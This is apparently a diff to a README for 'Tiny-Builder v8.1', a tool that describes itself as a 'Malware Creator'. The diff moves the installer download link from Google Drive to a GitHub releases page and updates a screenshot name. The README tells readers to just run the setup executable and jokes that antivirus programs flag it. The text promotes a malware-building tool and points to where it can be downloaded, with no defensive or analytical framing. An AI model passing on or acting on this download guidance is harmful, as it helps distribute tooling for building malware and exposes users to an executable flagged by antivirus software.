@@ -1,6 +1,6 @@
 # Tiny-Builder v8.1
 
-![ScreenShot of App](Tiny-Builder.png)
+![ScreenShot of App](Tiny-Builder8.1.png)
 
 ## Malware Creator
 
@@ -10,7 +10,7 @@
 ### How To Use ;
 
 > [!NOTE]
-> Just Run [Tiny-Builder-setup.exe](https://drive.google.com/file/d/1qgbZnCQjDVygeWPV7fJ_mlJmvjFfJJuj/view?usp=sharing) and Enjoy !! 
+> Just Run [Tiny-Builder-setup.exe](https://github.com/Abolfazl2687/Tiny-Builder/releases/) and Enjoy !! 
 >  & Unti-Viruses Are Not Friendly With This App ;)
 
 ### Features
